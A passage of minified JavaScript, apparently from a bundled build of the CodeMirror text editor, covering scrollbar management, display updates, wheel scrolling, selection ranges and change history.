S=i.doc.height+Bh(d),D=s.top<c,I=s.bottom>S-c;if(s.top<p)w.scrollTop=D?0:s.top;else if(s.bottom>p+y){var W=Math.min(s.top,(I?S:s.bottom)-y);W!=p&&(w.scrollTop=W)}var K=i.options.fixedGutter?0:d.gutters.offsetWidth,ie=i.curOp&&i.curOp.scrollLeft!=null?i.curOp.scrollLeft:d.scroller.scrollLeft-K,re=Ba(i)-d.gutters.offsetWidth,de=s.right-s.left>re;return de&&(s.right=s.left+re),s.left<10?w.scrollLeft=0:s.left<ie?w.scrollLeft=Math.max(0,s.left+K-(de?0:10)):s.right>re+ie-3&&(w.scrollLeft=s.right+(de?0:10)-re),w}function ep(i,s){s!=null&&(Sc(i),i.curOp.scrollTop=(i.curOp.scrollTop==null?i.doc.scrollTop:i.curOp.scrollTop)+s)}function _s(i){Sc(i);var s=i.getCursor();i.curOp.scrollToPos={from:s,to:s,margin:i.options.cursorScrollMargin}}function ro(i,s,d){(s!=null||d!=null)&&Sc(i),s!=null&&(i.curOp.scrollLeft=s),d!=null&&(i.curOp.scrollTop=d)}function BS(i,s){Sc(i),i.curOp.scrollToPos=s}function Sc(i){var s=i.curOp.scrollToPos;if(s){i.curOp.scrollToPos=null;var d=f1(i,s.from),c=f1(i,s.to);b1(i,d,c,s.margin)}}function b1(i,s,d,c){var p=Jh(i,{left:Math.min(s.left,d.left),top:Math.min(s.top,d.top)-c,right:Math.max(s.right,d.right),bottom:Math.max(s.bottom,d.bottom)+c});ro(i,p.scrollLeft,p.scrollTop)}function io(i,s){Math.abs(i.doc.scrollTop-s)<2||(a||np(i,{top:s}),E1(i,s,!0),a&&np(i),lo(i,100))}function E1(i,s,d){s=Math.max(0,Math.min(i.display.scroller.scrollHeight-i.display.scroller.clientHeight,s)),!(i.display.scroller.scrollTop==s&&!d)&&(i.doc.scrollTop=s,i.display.scrollbars.setScrollTop(s),i.display.scroller.scrollTop!=s&&(i.display.scroller.scrollTop=s))}function Wa(i,s,d,c){s=Math.max(0,Math.min(s,i.display.scroller.scrollWidth-i.display.scroller.clientWidth)),!((d?s==i.doc.scrollLeft:Math.abs(i.doc.scrollLeft-s)<2)&&!c)&&(i.doc.scrollLeft=s,S1(i),i.display.scroller.scrollLeft!=s&&(i.display.scroller.scrollLeft=s),i.display.scrollbars.setScrollLeft(s))}function ao(i){var s=i.display,d=s.gutters.offsetWidth,c=Math.round(i.doc.height+Bh(i.display));return{clientHeight:s.scroller.clientHeight,viewHeight:s.wrapper.clientHeight,scrollWidth:s.scroller.scrollWidth,clientWidth:s.scroller.clientWidth,viewWidth:s.wrapper.clientWidth,barLeft:i.options.fixedGutter?d:0,docHeight:c,scrollHeight:c+ni(i)+s.barHeight,nativeBarWidth:s.nativeBarWidth,gutterWidth:d}}var qa=function(i,s,d){this.cm=d;var c=this.vert=J("div",[J("div",null,null,"min-width: 1px")],"CodeMirror-vscrollbar"),p=this.horiz=J("div",[J("div",null,null,"height: 100%; min-height: 1px")],"CodeMirror-hscrollbar");c.tabIndex=p.tabIndex=-1,i(c),i(p),fe(c,"scroll",function(){c.clientHeight&&s(c.scrollTop,"vertical")}),fe(p,"scroll",function(){p.clientWidth&&s(p.scrollLeft,"horizontal")}),this.checkedZeroWidth=!1,h&&m<8&&(this.horiz.style.minHeight=this.vert.style.minWidth="18px")};qa.prototype.update=function(i){var s=i.scrollWidth>i.clientWidth+1,d=i.scrollHeight>i.clientHeight+1,c=i.nativeBarWidth;if(d){this.vert.style.display="block",this.vert.style.bottom=s?c+"px":"0";var p=i.viewHeight-(s?c:0);this.vert.firstChild.style.height=Math.max(0,i.scrollHeight-i.clientHeight+p)+"px"}else this.vert.scrollTop=0,this.vert.style.display="",this.vert.firstChild.style.height="0";if(s){this.horiz.style.display="block",this.horiz.style.right=d?c+"px":"0",this.horiz.style.left=i.barLeft+"px";var y=i.viewWidth-i.barLeft-(d?c:0);this.horiz.firstChild.style.width=Math.max(0,i.scrollWidth-i.clientWidth+y)+"px"}else this.horiz.style.display="",this.horiz.firstChild.style.width="0";return!this.checkedZeroWidth&&i.clientHeight>0&&(c==0&&this.zeroWidthHack(),this.checkedZeroWidth=!0),{right:d?c:0,bottom:s?c:0}},qa.prototype.setScrollLeft=function(i){this.horiz.scrollLeft!=i&&(this.horiz.scrollLeft=i),this.disableHoriz&&this.enableZeroWidthBar(this.horiz,this.disableHoriz,"horiz")},qa.prototype.setScrollTop=function(i){this.vert.scrollTop!=i&&(this.vert.scrollTop=i),this.disableVert&&this.enableZeroWidthBar(this.vert,this.disableVert,"vert")},qa.prototype.zeroWidthHack=function(){var i=M&&!O?"12px":"18px";this.horiz.style.height=this.vert.style.width=i,this.horiz.style.visibility=this.vert.style.visibility="hidden",this.disableHoriz=new Tt,this.disableVert=new Tt},qa.prototype.enableZeroWidthBar=function(i,s,d){i.style.visibility="";function c(){var p=i.getBoundingClientRect(),y=d=="vert"?document.elementFromPoint(p.right-1,(p.top+p.bottom)/2):document.elementFromPoint((p.right+p.left)/2,p.bottom-1);y!=i?i.style.visibility="hidden":s.set(1e3,c)}s.set(1e3,c)},qa.prototype.clear=function(){var i=this.horiz.parentNode;i.removeChild(this.horiz),i.removeChild(this.vert)};var so=function(){};so.prototype.update=function(){return{bottom:0,right:0}},so.prototype.setScrollLeft=function(){},so.prototype.setScrollTop=function(){},so.prototype.clear=function(){};function Is(i,s){s||(s=ao(i));var d=i.display.barWidth,c=i.display.barHeight;w1(i,s);for(var p=0;p<4&&d!=i.display.barWidth||c!=i.display.barHeight;p++)d!=i.display.barWidth&&i.options.lineWrapping&&Tc(i),w1(i,ao(i)),d=i.display.barWidth,c=i.display.barHeight}function w1(i,s){var d=i.display,c=d.scrollbars.update(s);d.sizer.style.paddingRight=(d.barWidth=c.right)+"px",d.sizer.style.paddingBottom=(d.barHeight=c.bottom)+"px",d.heightForcer.style.borderBottom=c.bottom+"px solid transparent",c.right&&c.bottom?(d.scrollbarFiller.style.display="block",d.scrollbarFiller.style.height=c.bottom+"px",d.scrollbarFiller.style.width=c.right+"px"):d.scrollbarFiller.style.display="",c.bottom&&i.options.coverGutterNextToScrollbar&&i.options.fixedGutter?(d.gutterFiller.style.display="block",d.gutterFiller.style.height=c.bottom+"px",d.gutterFiller.style.width=s.gutterWidth+"px"):d.gutterFiller.style.display=""}var k1={native:qa,null:so};function T1(i){i.display.scrollbars&&(i.display.scrollbars.clear(),i.display.scrollbars.addClass&&Z(i.display.wrapper,i.display.scrollbars.addClass)),i.display.scrollbars=new k1[i.options.scrollbarStyle](function(s){i.display.wrapper.insertBefore(s,i.display.scrollbarFiller),fe(s,"mousedown",function(){i.state.focused&&setTimeout(function(){return i.display.input.focus()},0)}),s.setAttribute("cm-not-content","true")},function(s,d){d=="horizontal"?Wa(i,s):io(i,s)},i),i.display.scrollbars.addClass&&q(i.display.wrapper,i.display.scrollbars.addClass)}var HS=0;function $a(i){i.curOp={cm:i,viewChanged:!1,startHeight:i.doc.height,forceUpdate:!1,updateInput:0,typing:!1,changeObjs:null,cursorActivityHandlers:null,cursorActivityCalled:0,selectionChanged:!1,updateMaxLine:!1,scrollLeft:null,scrollTop:null,scrollToPos:null,focus:!1,id:++HS,markArrays:null},xS(i.curOp)}function Ya(i){var s=i.curOp;s&&vS(s,function(d){for(var c=0;c<d.ops.length;c++)d.ops[c].cm.curOp=null;US(d)})}function US(i){for(var s=i.ops,d=0;d<s.length;d++)zS(s[d]);for(var c=0;c<s.length;c++)WS(s[c]);for(var p=0;p<s.length;p++)qS(s[p]);for(var y=0;y<s.length;y++)$S(s[y]);for(var w=0;w<s.length;w++)YS(s[w])}function zS(i){var s=i.cm,d=s.display;GS(s),i.updateMaxLine&&Fh(s),i.mustUpdate=i.viewChanged||i.forceUpdate||i.scrollTop!=null||i.scrollToPos&&(i.scrollToPos.from.line<d.viewFrom||i.scrollToPos.to.line>=d.viewTo)||d.maxLineChanged&&s.options.lineWrapping,i.update=i.mustUpdate&&new Nc(s,i.mustUpdate&&{top:i.scrollTop,ensure:i.scrollToPos},i.forceUpdate)}function WS(i){i.updatedDisplay=i.mustUpdate&&tp(i.cm,i.update)}function qS(i){var s=i.cm,d=s.display;i.updatedDisplay&&Tc(s),i.barMeasure=ao(s),d.maxLineChanged&&!s.options.lineWrapping&&(i.adjustWidthTo=i1(s,d.maxLine,d.maxLine.text.length).left+3,s.display.sizerWidth=i.adjustWidthTo,i.barMeasure.scrollWidth=Math.max(d.scroller.clientWidth,d.sizer.offsetLeft+i.adjustWidthTo+ni(s)+s.display.barWidth),i.maxScrollLeft=Math.max(0,d.sizer.offsetLeft+i.adjustWidthTo-Ba(s))),(i.updatedDisplay||i.selectionChanged)&&(i.preparedSelection=d.input.prepareSelection())}function $S(i){var s=i.cm;i.adjustWidthTo!=null&&(s.display.sizer.style.minWidth=i.adjustWidthTo+"px",i.maxScrollLeft<s.doc.scrollLeft&&Wa(s,Math.min(s.display.scroller.scrollLeft,i.maxScrollLeft),!0),s.display.maxLineChanged=!1);var d=i.focus&&i.focus==xe(se(s));i.preparedSelection&&s.display.input.showSelection(i.preparedSelection,d),(i.updatedDisplay||i.startHeight!=s.doc.height)&&Is(s,i.barMeasure),i.updatedDisplay&&ip(s,i.barMeasure),i.selectionChanged&&Kh(s),s.state.focused&&i.updateInput&&s.display.input.reset(i.typing),d&&y1(i.cm)}function YS(i){var s=i.cm,d=s.display,c=s.doc;if(i.updatedDisplay&&C1(s,i.update),d.wheelStartX!=null&&(i.scrollTop!=null||i.scrollLeft!=null||i.scrollToPos)&&(d.wheelStartX=d.wheelStartY=null),i.scrollTop!=null&&E1(s,i.scrollTop,i.forceScroll),i.scrollLeft!=null&&Wa(s,i.scrollLeft,!0,!0),i.scrollToPos){var p=FS(s,Je(c,i.scrollToPos.from),Je(c,i.scrollToPos.to),i.scrollToPos.margin);OS(s,p)}var y=i.maybeHiddenMarkers,w=i.maybeUnhiddenMarkers;if(y)for(var S=0;S<y.length;++S)y[S].lines.length||xt(y[S],"hide");if(w)for(var D=0;D<w.length;++D)w[D].lines.length&&xt(w[D],"unhide");d.wrapper.offsetHeight&&(c.scrollTop=s.display.scroller.scrollTop),i.changeObjs&&xt(s,"changes",s,i.changeObjs),i.update&&i.update.finish()}function tr(i,s){if(i.curOp)return s();$a(i);try{return s()}finally{Ya(i)}}function cn(i,s){return function(){if(i.curOp)return s.apply(i,arguments);$a(i);try{return s.apply(i,arguments)}finally{Ya(i)}}}function _n(i){return function(){if(this.curOp)return i.apply(this,arguments);$a(this);try{return i.apply(this,arguments)}finally{Ya(this)}}}function dn(i){return function(){var s=this.cm;if(!s||s.curOp)return i.apply(this,arguments);$a(s);try{return i.apply(this,arguments)}finally{Ya(s)}}}function lo(i,s){i.doc.highlightFrontier<i.display.viewTo&&i.state.highlight.set(s,Ke(VS,i))}function VS(i){var s=i.doc;if(!(s.highlightFrontier>=i.display.viewTo)){var d=+new Date+i.options.workTime,c=Kl(i,s.highlightFrontier),p=[];s.iter(c.line,Math.min(s.first+s.size,i.display.viewTo+500),function(y){if(c.line>=i.display.viewFrom){var w=y.styles,S=y.text.length>i.options.maxHighlightLength?Oa(s.mode,c.state):null,D=Ix(i,y,c,!0);S&&(c.state=S),y.styles=D.styles;var I=y.styleClasses,W=D.classes;W?y.styleClasses=W:I&&(y.styleClasses=null);for(var K=!w||w.length!=y.styles.length||I!=W&&(!I||!W||I.bgClass!=W.bgClass||I.textClass!=W.textClass),ie=0;!K&&ie<w.length;++ie)K=w[ie]!=y.styles[ie];K&&p.push(c.line),y.stateAfter=c.save(),c.nextLine()}else y.text.length<=i.options.maxHighlightLength&&_h(i,y.text,c),y.stateAfter=c.line%5==0?c.save():null,c.nextLine();if(+new Date>d)return lo(i,i.options.workDelay),!0}),s.highlightFrontier=c.line,s.modeFrontier=Math.max(s.modeFrontier,c.line),p.length&&tr(i,function(){for(var y=0;y<p.length;y++)Yi(i,p[y],"text")})}}var Nc=function(i,s,d){var c=i.display;this.viewport=s,this.visible=Cc(c,i.doc,s),this.editorIsHidden=!c.wrapper.offsetWidth,this.wrapperHeight=c.wrapper.clientHeight,this.wrapperWidth=c.wrapper.clientWidth,this.oldDisplayWidth=Ba(i),this.force=d,this.dims=Yh(i),this.events=[]};Nc.prototype.signal=function(i,s){gn(i,s)&&this.events.push(arguments)},Nc.prototype.finish=function(){for(var i=0;i<this.events.length;i++)xt.apply(null,this.events[i])};function GS(i){var s=i.display;!s.scrollbarsClipped&&s.scroller.offsetWidth&&(s.nativeBarWidth=s.scroller.offsetWidth-s.scroller.clientWidth,s.heightForcer.style.height=ni(i)+"px",s.sizer.style.marginBottom=-s.nativeBarWidth+"px",s.sizer.style.borderRightWidth=ni(i)+"px",s.scrollbarsClipped=!0)}function QS(i){if(i.hasFocus())return null;var s=xe(se(i));if(!s||!ae(i.display.lineDiv,s))return null;var d={activeElt:s};if(window.getSelection){var c=De(i).getSelection();c.anchorNode&&c.extend&&ae(i.display.lineDiv,c.anchorNode)&&(d.anchorNode=c.anchorNode,d.anchorOffset=c.anchorOffset,d.focusNode=c.focusNode,d.focusOffset=c.focusOffset)}return d}function KS(i){if(!(!i||!i.activeElt||i.activeElt==xe(Ve(i.activeElt)))&&(i.activeElt.focus(),!/^(INPUT|TEXTAREA)$/.test(i.activeElt.nodeName)&&i.anchorNode&&ae(document.body,i.anchorNode)&&ae(document.body,i.focusNode))){var s=i.activeElt.ownerDocument,d=s.defaultView.getSelection(),c=s.createRange();c.setEnd(i.anchorNode,i.anchorOffset),c.collapse(!1),d.removeAllRanges(),d.addRange(c),d.extend(i.focusNode,i.focusOffset)}}function tp(i,s){var d=i.display,c=i.doc;if(s.editorIsHidden)return Vi(i),!1;if(!s.force&&s.visible.from>=d.viewFrom&&s.visible.to<=d.viewTo&&(d.updateLineNumbers==null||d.updateLineNumbers>=d.viewTo)&&d.renderedView==d.view&&g1(i)==0)return!1;N1(i)&&(Vi(i),s.dims=Yh(i));var p=c.first+c.size,y=Math.max(s.visible.from-i.options.viewportMargin,c.first),w=Math.min(p,s.visible.to+i.options.viewportMargin);d.viewFrom<y&&y-d.viewFrom<20&&(y=Math.max(c.first,d.viewFrom)),d.viewTo>w&&d.viewTo-w<20&&(w=Math.min(p,d.viewTo)),gi&&(y=Rh(i.doc,y),w=Yx(i.doc,w));var S=y!=d.viewFrom||w!=d.viewTo||d.lastWrapHeight!=s.wrapperHeight||d.lastWrapWidth!=s.wrapperWidth;jS(i,y,w),d.viewOffset=xi(Ye(i.doc,d.viewFrom)),i.display.mover.style.top=d.viewOffset+"px";var D=g1(i);if(!S&&D==0&&!s.force&&d.renderedView==d.view&&(d.updateLineNumbers==null||d.updateLineNumbers>=d.viewTo))return!1;var I=QS(i);return D>4&&(d.lineDiv.style.display="none"),XS(i,d.updateLineNumbers,s.dims),D>4&&(d.lineDiv.style.display=""),d.renderedView=d.view,KS(I),me(d.cursorDiv),me(d.selectionDiv),d.gutters.style.height=d.sizer.style.minHeight=0,S&&(d.lastWrapHeight=s.wrapperHeight,d.lastWrapWidth=s.wrapperWidth,lo(i,400)),d.updateLineNumbers=null,!0}function C1(i,s){for(var d=s.viewport,c=!0;;c=!1){if(!c||!i.options.lineWrapping||s.oldDisplayWidth==Ba(i)){if(d&&d.top!=null&&(d={top:Math.min(i.doc.height+Bh(i.display)-Hh(i),d.top)}),s.visible=Cc(i.display,i.doc,d),s.visible.from>=i.display.viewFrom&&s.visible.to<=i.display.viewTo)break}else c&&(s.visible=Cc(i.display,i.doc,d));if(!tp(i,s))break;Tc(i);var p=ao(i);no(i),Is(i,p),ip(i,p),s.force=!1}s.signal(i,"update",i),(i.display.viewFrom!=i.display.reportedViewFrom||i.display.viewTo!=i.display.reportedViewTo)&&(s.signal(i,"viewportChange",i,i.display.viewFrom,i.display.viewTo),i.display.reportedViewFrom=i.display.viewFrom,i.display.reportedViewTo=i.display.viewTo)}function np(i,s){var d=new Nc(i,s);if(tp(i,d)){Tc(i),C1(i,d);var c=ao(i);no(i),Is(i,c),ip(i,c),d.finish()}}function XS(i,s,d){var c=i.display,p=i.options.lineNumbers,y=c.lineDiv,w=y.firstChild;function S(de){var ge=de.nextSibling;return x&&M&&i.display.currentWheelTarget==de?de.style.display="none":de.parentNode.removeChild(de),ge}for(var D=c.view,I=c.viewFrom,W=0;W<D.length;W++){var K=D[W];if(!K.hidden)if(!K.node||K.node.parentNode!=y){var ie=TS(i,K,I,d);y.insertBefore(ie,w)}else{for(;w!=K.node;)w=S(w);var re=p&&s!=null&&s<=I&&K.lineNumber;K.changes&&(ut(K.changes,"gutter")>-1&&(re=!1),Xx(i,K,I,d)),re&&(me(K.lineNumber),K.lineNumber.appendChild(document.createTextNode(Ah(i.options,I)))),w=K.node.nextSibling}I+=K.size}for(;w;)w=S(w)}function rp(i){var s=i.gutters.offsetWidth;i.sizer.style.marginLeft=s+"px",un(i,"gutterChanged",i)}function ip(i,s){i.display.sizer.style.minHeight=s.docHeight+"px",i.display.heightForcer.style.top=s.docHeight+"px",i.display.gutters.style.height=s.docHeight+i.display.barHeight+ni(i)+"px"}function S1(i){var s=i.display,d=s.view;if(!(!s.alignWidgets&&(!s.gutters.firstChild||!i.options.fixedGutter))){for(var c=Vh(s)-s.scroller.scrollLeft+i.doc.scrollLeft,p=s.gutters.offsetWidth,y=c+"px",w=0;w<d.length;w++)if(!d[w].hidden){i.options.fixedGutter&&(d[w].gutter&&(d[w].gutter.style.left=y),d[w].gutterBackground&&(d[w].gutterBackground.style.left=y));var S=d[w].alignable;if(S)for(var D=0;D<S.length;D++)S[D].style.left=y}i.options.fixedGutter&&(s.gutters.style.left=c+p+"px")}}function N1(i){if(!i.options.lineNumbers)return!1;var s=i.doc,d=Ah(i.options,s.first+s.size-1),c=i.display;if(d.length!=c.lineNumChars){var p=c.measure.appendChild(J("div",[J("div",d)],"CodeMirror-linenumber CodeMirror-gutter-elt")),y=p.firstChild.offsetWidth,w=p.offsetWidth-y;return c.lineGutter.style.width="",c.lineNumInnerWidth=Math.max(y,c.lineGutter.offsetWidth-w)+1,c.lineNumWidth=c.lineNumInnerWidth+w,c.lineNumChars=c.lineNumInnerWidth?d.length:-1,c.lineGutter.style.width=c.lineNumWidth+"px",rp(i.display),!0}return!1}function ap(i,s){for(var d=[],c=!1,p=0;p<i.length;p++){var y=i[p],w=null;if(typeof y!="string"&&(w=y.style,y=y.className),y=="CodeMirror-linenumbers")if(s)c=!0;else continue;d.push({className:y,style:w})}return s&&!c&&d.push({className:"CodeMirror-linenumbers",style:null}),d}function A1(i){var s=i.gutters,d=i.gutterSpecs;me(s),i.lineGutter=null;for(var c=0;c<d.length;++c){var p=d[c],y=p.className,w=p.style,S=s.appendChild(J("div",null,"CodeMirror-gutter "+y));w&&(S.style.cssText=w),y=="CodeMirror-linenumbers"&&(i.lineGutter=S,S.style.width=(i.lineNumWidth||1)+"px")}s.style.display=d.length?"":"none",rp(i)}function oo(i){A1(i.display),qn(i),S1(i)}function ZS(i,s,d,c){var p=this;this.input=d,p.scrollbarFiller=J("div",null,"CodeMirror-scrollbar-filler"),p.scrollbarFiller.setAttribute("cm-not-content","true"),p.gutterFiller=J("div",null,"CodeMirror-gutter-filler"),p.gutterFiller.setAttribute("cm-not-content","true"),p.lineDiv=pe("div",null,"CodeMirror-code"),p.selectionDiv=J("div",null,null,"position: relative; z-index: 1"),p.cursorDiv=J("div",null,"CodeMirror-cursors"),p.measure=J("div",null,"CodeMirror-measure"),p.lineMeasure=J("div",null,"CodeMirror-measure"),p.lineSpace=pe("div",[p.measure,p.lineMeasure,p.selectionDiv,p.cursorDiv,p.lineDiv],null,"position: relative; outline: none");var y=pe("div",[p.lineSpace],"CodeMirror-lines");p.mover=J("div",[y],null,"position: relative"),p.sizer=J("div",[p.mover],"CodeMirror-sizer"),p.sizerWidth=null,p.heightForcer=J("div",null,null,"position: absolute; height: "+bt+"px; width: 1px;"),p.gutters=J("div",null,"CodeMirror-gutters"),p.lineGutter=null,p.scroller=J("div",[p.sizer,p.heightForcer,p.gutters],"CodeMirror-scroll"),p.scroller.setAttribute("tabIndex","-1"),p.wrapper=J("div",[p.scrollbarFiller,p.gutterFiller,p.scroller],"CodeMirror"),b&&E===105&&(p.wrapper.style.clipPath="inset(0px)"),p.wrapper.setAttribute("translate","no"),h&&m<8&&(p.gutters.style.zIndex=-1,p.scroller.style.paddingRight=0),!x&&!(a&&_)&&(p.scroller.draggable=!0),i&&(i.appendChild?i.appendChild(p.wrapper):i(p.wrapper)),p.viewFrom=p.viewTo=s.first,p.reportedViewFrom=p.reportedViewTo=s.first,p.view=[],p.renderedView=null,p.externalMeasured=null,p.viewOffset=0,p.lastWrapHeight=p.lastWrapWidth=0,p.updateLineNumbers=null,p.nativeBarWidth=p.barHeight=p.barWidth=0,p.scrollbarsClipped=!1,p.lineNumWidth=p.lineNumInnerWidth=p.lineNumChars=null,p.alignWidgets=!1,p.cachedCharWidth=p.cachedTextHeight=p.cachedPaddingH=null,p.maxLine=null,p.maxLineLength=0,p.maxLineChanged=!1,p.wheelDX=p.wheelDY=p.wheelStartX=p.wheelStartY=null,p.shift=!1,p.selForContextMenu=null,p.activeTouch=null,p.gutterSpecs=ap(c.gutters,c.lineNumbers),A1(p),d.init(p)}var Ac=0,vi=null;h?vi=-.53:a?vi=15:b?vi=-.7:P&&(vi=-1/3);function D1(i){var s=i.wheelDeltaX,d=i.wheelDeltaY;return s==null&&i.detail&&i.axis==i.HORIZONTAL_AXIS&&(s=i.detail),d==null&&i.detail&&i.axis==i.VERTICAL_AXIS?d=i.detail:d==null&&(d=i.wheelDelta),{x:s,y:d}}function JS(i){var s=D1(i);return s.x*=vi,s.y*=vi,s}function L1(i,s){b&&E==102&&(i.display.chromeScrollHack==null?i.display.sizer.style.pointerEvents="none":clearTimeout(i.display.chromeScrollHack),i.display.chromeScrollHack=setTimeout(function(){i.display.chromeScrollHack=null,i.display.sizer.style.pointerEvents=""},100));var d=D1(s),c=d.x,p=d.y,y=vi;s.deltaMode===0&&(c=s.deltaX,p=s.deltaY,y=1);var w=i.display,S=w.scroller,D=S.scrollWidth>S.clientWidth,I=S.scrollHeight>S.clientHeight;if(c&&D||p&&I){if(p&&M&&x){e:for(var W=s.target,K=w.view;W!=S;W=W.parentNode)for(var ie=0;ie<K.length;ie++)if(K[ie].node==W){i.display.currentWheelTarget=W;break e}}if(c&&!a&&!C&&y!=null){p&&I&&io(i,Math.max(0,S.scrollTop+p*y)),Wa(i,Math.max(0,S.scrollLeft+c*y)),(!p||p&&I)&&Bt(s),w.wheelStartX=null;return}if(p&&y!=null){var re=p*y,de=i.doc.scrollTop,ge=de+w.wrapper.clientHeight;re<0?de=Math.max(0,de+re-50):ge=Math.min(i.doc.height,ge+re+50),np(i,{top:de,bottom:ge})}Ac<20&&s.deltaMode!==0&&(w.wheelStartX==null?(w.wheelStartX=S.scrollLeft,w.wheelStartY=S.scrollTop,w.wheelDX=c,w.wheelDY=p,setTimeout(function(){if(w.wheelStartX!=null){var ke=S.scrollLeft-w.wheelStartX,Ie=S.scrollTop-w.wheelStartY,Oe=Ie&&w.wheelDY&&Ie/w.wheelDY||ke&&w.wheelDX&&ke/w.wheelDX;w.wheelStartX=w.wheelStartY=null,Oe&&(vi=(vi*Ac+Oe)/(Ac+1),++Ac)}},200)):(w.wheelDX+=c,w.wheelDY+=p))}}var hr=function(i,s){this.ranges=i,this.primIndex=s};hr.prototype.primary=function(){return this.ranges[this.primIndex]},hr.prototype.equals=function(i){if(i==this)return!0;if(i.primIndex!=this.primIndex||i.ranges.length!=this.ranges.length)return!1;for(var s=0;s<this.ranges.length;s++){var d=this.ranges[s],c=i.ranges[s];if(!Dh(d.anchor,c.anchor)||!Dh(d.head,c.head))return!1}return!0},hr.prototype.deepCopy=function(){for(var i=[],s=0;s<this.ranges.length;s++)i[s]=new yt(Lh(this.ranges[s].anchor),Lh(this.ranges[s].head));return new hr(i,this.primIndex)},hr.prototype.somethingSelected=function(){for(var i=0;i<this.ranges.length;i++)if(!this.ranges[i].empty())return!0;return!1},hr.prototype.contains=function(i,s){s||(s=i);for(var d=0;d<this.ranges.length;d++){var c=this.ranges[d];if(Ze(s,c.from())>=0&&Ze(i,c.to())<=0)return d}return-1};var yt=function(i,s){this.anchor=i,this.head=s};yt.prototype.from=function(){return dc(this.anchor,this.head)},yt.prototype.to=function(){return cc(this.anchor,this.head)},yt.prototype.empty=function(){return this.head.line==this.anchor.line&&this.head.ch==this.anchor.ch};function Ur(i,s,d){var c=i&&i.options.selectionsMayTouch,p=s[d];s.sort(function(ie,re){return Ze(ie.from(),re.from())}),d=ut(s,p);for(var y=1;y<s.length;y++){var w=s[y],S=s[y-1],D=Ze(S.to(),w.from());if(c&&!w.empty()?D>0:D>=0){var I=dc(S.from(),w.from()),W=cc(S.to(),w.to()),K=S.empty()?w.from()==w.head:S.from()==S.head;y<=d&&--d,s.splice(--y,2,new yt(K?W:I,K?I:W))}}return new hr(s,d)}function Gi(i,s){return new hr([new yt(i,s||i)],0)}function Qi(i){return i.text?ve(i.from.line+i.text.length-1,it(i.text).length+(i.text.length==1?i.from.ch:0)):i.to}function _1(i,s){if(Ze(i,s.from)<0)return i;if(Ze(i,s.to)<=0)return Qi(s);var d=i.line+s.text.length-(s.to.line-s.from.line)-1,c=i.ch;return i.line==s.to.line&&(c+=Qi(s).ch-s.to.ch),ve(d,c)}function sp(i,s){for(var d=[],c=0;c<i.sel.ranges.length;c++){var p=i.sel.ranges[c];d.push(new yt(_1(p.anchor,s),_1(p.head,s)))}return Ur(i.cm,d,i.sel.primIndex)}function I1(i,s,d){return i.line==s.line?ve(d.line,i.ch-s.ch+d.ch):ve(d.line+(i.line-s.line),i.ch)}function eN(i,s,d){for(var c=[],p=ve(i.first,0),y=p,w=0;w<s.length;w++){var S=s[w],D=I1(S.from,p,y),I=I1(Qi(S),p,y);if(p=S.to,y=I,d=="around"){var W=i.sel.ranges[w],K=Ze(W.head,W.anchor)<0;c[w]=new yt(K?I:D,K?D:I)}else c[w]=new yt(D,D)}return new hr(c,i.sel.primIndex)}function lp(i){i.doc.mode=Ch(i.options,i.doc.modeOption),uo(i)}function uo(i){i.doc.iter(function(s){s.stateAfter&&(s.stateAfter=null),s.styles&&(s.styles=null)}),i.doc.modeFrontier=i.doc.highlightFrontier=i.doc.first,lo(i,100),i.state.modeGen++,i.curOp&&qn(i)}function P1(i,s){return s.from.ch==0&&s.to.ch==0&&it(s.text)==""&&(!i.cm||i.cm.options.wholeLineUpdateBefore)}function op(i,s,d,c){function p(Oe){return d?d[Oe]:null}function y(Oe,Pe,Me){oS(Oe,Pe,Me,c),un(Oe,"change",Oe,s)}function w(Oe,Pe){for(var Me=[],Qe=Oe;Qe<Pe;++Qe)Me.push(new Cs(I[Qe],p(Qe),c));return Me}var S=s.from,D=s.to,I=s.text,W=Ye(i,S.line),K=Ye(i,D.line),ie=it(I),re=p(I.length-1),de=D.line-S.line;if(s.full)i.insert(0,w(0,I.length)),i.remove(I.length,i.size-I.length);else if(P1(i,s)){var ge=w(0,I.length-1);y(K,K.text,re),de&&i.remove(S.line,de),ge.length&&i.insert(S.line,ge)}else if(W==K)if(I.length==1)y(W,W.text.slice(0,S.ch)+ie+W.text.slice(D.ch),re);else{var ke=w(1,I.length-1);ke.push(new Cs(ie+W.text.slice(D.ch),re,c)),y(W,W.text.slice(0,S.ch)+I[0],p(0)),i.insert(S.line+1,ke)}else if(I.length==1)y(W,W.text.slice(0,S.ch)+I[0]+K.text.slice(D.ch),p(0)),i.remove(S.line+1,de);else{y(W,W.text.slice(0,S.ch)+I[0],p(0)),y(K,ie+K.text.slice(D.ch),re);var Ie=w(1,I.length-1);de>1&&i.remove(S.line+1,de-1),i.insert(S.line+1,Ie)}un(i,"change",i,s)}function Ki(i,s,d){function c(p,y,w){if(p.linked)for(var S=0;S<p.linked.length;++S){var D=p.linked[S];if(D.doc!=y){var I=w&&D.sharedHist;d&&!I||(s(D.doc,I),c(D.doc,p,I))}}}c(i,null,!0)}function j1(i,s){if(s.cm)throw new Error("This document is already in use.");i.doc=s,s.cm=i,Gh(i),lp(i),R1(i),i.options.direction=s.direction,i.options.lineWrapping||Fh(i),i.options.mode=s.modeOption,qn(i)}function R1(i){(i.doc.direction=="rtl"?q:Z)(i.display.lineDiv,"CodeMirror-rtl")}function tN(i){tr(i,function(){R1(i),qn(i)})}function Dc(i){this.done=[],this.undone=[],this.undoDepth=i?i.undoDepth:1/0,this.lastModTime=this.lastSelTime=0,this.lastOp=this.lastSelOp=null,this.lastOrigin=this.lastSelOrigin=null,this.generation=this.maxGeneration=i?i.maxGeneration:1}function up(i,s){var d={from:Lh(s.from),to:Qi(s),text:Fa(i,s.from,s.to)};return M1(i,d,s.from.line,s.to.line+1),Ki(i,function(c){return M1(c,d,s.from.line,s.to.line+1)},!0),d}function O1(i){for(;i.length;){var s=it(i);if(s.ranges)i.pop();else break}}function nN(i,s){if(s)return O1(i.done),it(i.done);if(i.done.length&&!it(i.done).ranges)return it(i.done);if(i.done.length>1&&!i.done[i.done.length-2].ranges)return i.done.pop(),it(i.done)}function F1(i,s,d,c){var p=i.history;p.undone.length=0;var y=+new Date,w,S;if((p.lastOp==c||p.lastOrigin==s.origin&&s.origin&&(s.origin.charAt(0)=="+"&&p.lastModTime>y-(i.cm?i.cm.options.historyEventDelay:500)||s.origin.charAt(0)=="*"))&&(w=nN(p,p.lastOp==c)))S=it(w.changes),Ze(s.from,s.to)==0&&Ze(s.from,S.to)==0?S.to=Qi(s):w.changes.push(up(i,s));else{var 